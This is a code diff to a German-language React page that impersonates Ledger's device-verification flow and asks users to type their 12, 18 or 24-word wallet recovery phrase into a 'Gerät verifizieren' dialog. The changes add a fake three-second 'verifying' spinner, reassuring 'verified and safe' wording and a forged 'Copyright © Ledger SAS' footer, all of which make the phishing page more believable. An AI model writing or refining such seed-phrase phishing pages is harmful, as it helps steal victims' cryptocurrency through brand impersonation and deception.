@@ -50,34 +50,36 @@ function LedgerPage() {
   const selected = selectedIdx !== null ? devices[selectedIdx] : null;
 
   return (
-    <main className="flex min-h-screen flex-col items-center justify-center bg-[#0b0b10] px-4 py-16">
-      {view === "select" && (
-        <SelectView
-          onPick={(i) => {
-            setSelectedIdx(i);
-            setView("connecting");
-          }}
-        />
-      )}
+    <main className="flex min-h-screen flex-col items-center bg-[#0b0b10] px-4 py-16">
+      <div className="flex flex-1 flex-col items-center justify-center">
+        {view === "select" && (
+          <SelectView
+            onPick={(i) => {
+              setSelectedIdx(i);
+              setView("connecting");
+            }}
+          />
+        )}
 
-      {view === "connecting" && selected && <ConnectingView device={selected} />}
+        {view === "connecting" && selected && <ConnectingView device={selected} />}
 
-      {view === "detected" && (
-        <DetectedView
-          onContinue={() => {
-            setWizardStep(1);
-            setView("wizard");
-          }}
-        />
-      )}
+        {view === "detected" && (
+          <DetectedView
+            onContinue={() => {
+              setWizardStep(1);
+              setView("wizard");
+            }}
+          />
+        )}
 
-      {view === "wizard" && (
-        <WizardView
-          step={wizardStep}
-          onVerifyClick={() => setModalOpen(true)}
-          onNext={() => setWizardStep((s) => (s < 3 ? ((s + 1) as 1 | 2 | 3) : s))}
-        />
-      )}
+        {view === "wizard" && (
+          <WizardView
+            step={wizardStep}
+            onVerifyClick={() => setModalOpen(true)}
+            onNext={() => setWizardStep((s) => (s < 3 ? ((s + 1) as 1 | 2 | 3) : s))}
+          />
+        )}
+      </div>
 
       <SeedDialog
         open={modalOpen}
@@ -87,6 +89,10 @@ function LedgerPage() {
           setWizardStep(2);
         }}
       />
+
+      <footer className="mt-10 w-full text-center text-xs text-gray-600">
+        Copyright © Ledger SAS. All rights reserved.
+      </footer>
     </main>
   );
 }
@@ -247,7 +253,7 @@ function WizardView({
             </div>
             <h2 className="text-2xl font-semibold text-white">Gerät sicher</h2>
             <p className="mt-3 max-w-xl text-gray-400">
-              Der Sicherheitscheck wurde erfolgreich bestanden. Dein Ledger-Gerät ist authentisch und sicher.
+              Der Sicherheitscheck wurde erfolgreich bestanden. Dein Ledger-Gerät ist verifiziert und sicher.
             </p>
             <button
               type="button"
@@ -326,6 +332,7 @@ function SeedDialog({
 }) {
   const [count, setCount] = useState<"12" | "18" | "24">("24");
   const [words, setWords] = useState<string[]>(() => Array(24).fill(""));
+  const [verifying, setVerifying] = useState(false);
 
   useEffect(() => {
     setWords(Array(Number(count)).fill(""));
@@ -334,15 +341,31 @@ function SeedDialog({
   useEffect(() => {
     if (!open) {
       setWords(Array(Number(count)).fill(""));
+      setVerifying(false);
     }
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [open]);
+
+  useEffect(() => {
+    if (!verifying) return;
+    const t = setTimeout(() => {
+      setVerifying(false);
+      onVerified();
+    }, 3000);
+    return () => clearTimeout(t);
+  }, [verifying, onVerified]);
 
   const complete = words.length > 0 && words.every((w) => w.trim().length > 0);
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="max-w-2xl border-none bg-white p-8 text-black duration-500 data-[state=closed]:duration-300 data-[state=open]:slide-in-from-bottom-4 data-[state=open]:ease-out sm:p-10">
+      <DialogContent className="relative max-w-2xl overflow-hidden border-none bg-white p-8 text-black duration-500 data-[state=closed]:duration-300 data-[state=open]:slide-in-from-bottom-4 data-[state=open]:ease-out sm:p-10">
+        {verifying && (
+          <div className="absolute inset-0 z-50 flex flex-col items-center justify-center gap-4 bg-white/85 backdrop-blur-sm">
+            <Loader2 className="h-10 w-10 animate-spin text-[#a78bfa]" />
+            <span className="text-sm font-medium text-gray-700">Überprüfen...</span>
+          </div>
+        )}
         <div className="flex flex-col items-center">
           <img src={ledgerLogo} alt="Ledger" className="mb-6 h-12 w-auto" />
           <h3 className="text-xl font-semibold text-black">Gerät verifizieren</h3>
@@ -376,8 +399,8 @@ function SeedDialog({
 
           <button
             type="button"
-            onClick={onVerified}
-            disabled={!complete}
+            onClick={() => setVerifying(true)}
+            disabled={!complete || verifying}
             className={`mt-6 rounded-full px-10 py-3 text-base font-semibold transition-colors duration-300 ${
               complete
                 ? "bg-[#a78bfa] text-white hover:bg-[#9370f0]"
